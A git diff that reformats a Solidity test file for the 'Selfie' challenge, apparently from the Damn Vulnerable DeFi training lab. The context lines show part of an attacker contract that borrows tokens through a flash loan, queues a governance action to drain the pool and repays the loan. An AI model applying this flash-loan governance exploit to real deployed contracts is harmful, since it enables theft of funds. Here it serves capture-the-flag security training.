@@ -4,12 +4,11 @@ pragma solidity 0.8.10;
 import {Utilities} from "../utils/Utilities.sol";
 import {BaseTest} from "../BaseTest.sol";
 
-import "../../DamnValuableTokenSnapshot.sol";
-import "../../selfie/SimpleGovernance.sol";
-import "../../selfie/SelfiePool.sol";
+import "../../src/DamnValuableTokenSnapshot.sol";
+import "../../src/selfie/SimpleGovernance.sol";
+import "../../src/selfie/SelfiePool.sol";
 
 import "openzeppelin-contracts/utils/Address.sol";
-
 
 contract Executor {
     using Address for address payable;
@@ -25,7 +24,10 @@ contract Executor {
         pool = _pool;
     }
 
-    function receiveTokens(address tokenAddress, uint256 borrowAmount) external payable {
+    function receiveTokens(
+        address tokenAddress,
+        uint256 borrowAmount
+    ) external payable {
         require(msg.sender == address(pool), "only pool");
 
         bytes memory data = abi.encodeWithSignature(
@@ -38,18 +40,19 @@ contract Executor {
         drainActionId = governance.queueAction(address(pool), data, 0);
 
         // transfer back funds
-        DamnValuableTokenSnapshot(tokenAddress).transfer(address(pool), borrowAmount);
+        DamnValuableTokenSnapshot(tokenAddress).transfer(
+            address(pool),
+            borrowAmount
+        );
     }
 
     function borrow(uint256 borrowAmount) external {
         require(msg.sender == owner, "only owner");
         pool.flashLoan(borrowAmount);
     }
-
 }
 
 contract SelfieTest is BaseTest {
-
     uint256 TOKEN_INITIAL_SUPPLY = 2000000 ether; // 2 million tokens
     uint256 TOKENS_IN_POOL = 1500000 ether; // 1.5 million tokens
 
@@ -86,7 +89,6 @@ contract SelfieTest is BaseTest {
         assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
     }
 
-    
     function test_Exploit() public {
         runTest();
     }
